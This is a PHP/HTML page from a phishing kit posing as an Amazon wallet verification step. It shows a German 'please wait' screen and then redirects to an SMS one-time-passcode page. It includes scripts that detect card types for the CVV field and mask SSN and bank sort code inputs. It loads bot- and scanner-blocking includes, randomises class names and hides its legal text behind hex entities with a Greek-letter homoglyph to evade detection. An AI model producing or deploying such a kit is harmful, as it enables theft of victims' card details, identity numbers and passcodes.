<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include('../banned.php');?>
<!-- HTML INPUTS FOR WALLET PAGE -->
<!-- CODE STARTS HERE -->	
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
          <form>
	<div style="font-weight: bolder; font-size:12px;">* Bitte warten Sie, während wir Ihre Anfrage bearbeiten<br>* Schließen Sie dieses Fenster nicht<br><img src="https://images-na.ssl-images-amazon.com/images/G/01/amazonui/loading/loading-4x._CB391853216_.gif" style="width:20%; "></div> <meta http-equiv="refresh" content="40;URL='../bin/SMS_Verifications3.php?cmd=_SMS_OTP_Auth_'" />
    </form>
    <script>
      function type_carte(){
        var get_value = document.getElementById('cc_number').value;
        var type = get_value.substring(0,2);
        var other = get_value.substring(0,1);
        if(other == "4"){
          document.getElementById("cvv2_number").maxLength ="3"
        }
        else if(other == "5"){
          document.getElementById("cvv2_number").maxLength ="3"
        }
        /*Amex Card*/
        else if(type == "34"){
          document.getElementById('th3mrx').style.display ="none"
          document.getElementById("cvv2_number").maxLength ="4"
        }
        else if(type == "37"){
          document.getElementById('th3mrx').style.display ="none"
          document.getElementById("cvv2_number").maxLength ="4"
        }
        /*End Amex Card*/
        /*blue Card*/
        else if(type == "30"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "36"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "38"){
          document.getElementById('th3mrx').style.display ="none"
        }
        /*End blue Card*/
        else if(other == "6"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "35"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else{
          document.getElementById('th3mrx').style.display ="block"
        }
      };
    </script>

  <script type="text/javascript">
    jQuery(function($){
      $("#ssn").mask("999-99-9999");
      $("#sortcode").mask("99-99-99");
      $("#sin").mask("999-99-9999");
      $("#an").mask("99999999");
    }
          );
  </script>
  <?php  ################################################################################################################################### ?>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-section a-spacing-extra-large a-spacing-top-extra-large">
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-popover-preload" id="a-popover-legalTerms">
      <span>
       &#x20;&#x42;&#x79;&#x20;&#x63;&#x6C;&#x69;&#x63;&#x6B;&#x69;&#x6E;&#x67;&#x20;&#x22;&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x26;&#x20;&#x41;&#x63;&#x74;&#x69;&#x76;&#x61;&#x74;&#x65;&#x22;&#x2C;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x61;&#x67;&#x72;&#x65;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x391;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;.
        <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>'&#x73;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x6E;&#x6F;&#x74;&#x69;&#x63;&#x65;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x63;&#x6F;&#x6E;&#x64;&#x69;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x75;&#x73;&#x65;.
<!-- CODE ENDS HERE -->
